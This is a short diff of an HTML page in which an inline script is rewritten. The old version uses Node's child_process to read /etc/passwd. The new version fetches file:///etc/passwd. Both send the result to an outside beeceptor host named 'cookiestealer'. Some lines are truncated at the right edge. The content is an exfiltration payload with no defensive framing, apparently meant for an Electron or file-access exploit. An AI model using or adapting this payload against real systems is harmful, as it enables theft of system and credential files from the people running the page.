@@ -5,9 +5,12 @@
     </head>
     <body>
         <script>
-    require('child_process').exec('cat /etc/passwd | head -n 1', (err, stdout>
-        fetch("https://cookiestealer.free.beeceptor.com/exfil?data=" + encode>
-    });
+fetch("file:///etc/passwd")
+    .then(response => response.text())
+    .then(data => {
+    fetch("https://cookiestealer.free.beeceptor.com/?token=" + encodeURICompo>
+});
+
         </script>
     </body>
 </html>
